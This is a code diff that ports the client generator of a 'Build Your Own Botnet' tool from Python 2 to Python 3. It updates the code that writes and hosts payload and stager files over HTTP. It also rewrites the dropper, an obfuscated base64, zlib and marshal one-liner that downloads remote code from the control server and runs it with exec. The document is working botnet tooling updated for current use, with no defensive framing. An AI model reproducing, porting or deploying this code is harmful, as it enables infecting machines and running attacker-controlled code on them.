@@ -87,7 +87,6 @@ import struct
 import base64
 import random
 import urllib
-import urllib2
 import marshal
 import logging
 import requests
@@ -126,10 +125,10 @@ def main():
     Run the generator
 
     """
-    util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
+    fltr = filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))
+    util.display(globals()['__banner'], color=random.choice(list(fltr)), style='normal')
 
     parser = argparse.ArgumentParser(prog='client.py', 
-                                    version='0.1.5',
                                     description="Generator (Build Your Own Botnet)")
 
     parser.add_argument('host',
@@ -253,7 +252,7 @@ def _imports(options, **kwargs):
     imports = list(imports)
     if sys.platform != 'win32':
         for item in imports:
-            if 'win32' in item or '_winreg' in item:
+            if 'win32' in item or 'winreg' in item:
                 imports.remove(item)
     return imports
                  
@@ -337,12 +336,12 @@ def _payload(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(payload)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
-        s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.request.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = urllib.parse.urlsplit(s)
+        url = urllib.parse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
     util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
@@ -401,12 +400,12 @@ def _stager(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
-        s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.request.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = urllib.parse.urlsplit(s)
+        url = urllib.parse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
     util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
@@ -424,8 +423,8 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
-    with file(name, 'w') as fp:
+    dropper = "import zlib,base64,marshal,urllib.request;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib.request;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.request.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.request.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    with open(name, 'w') as fp:
         fp.write(dropper)
 
     if options.freeze:
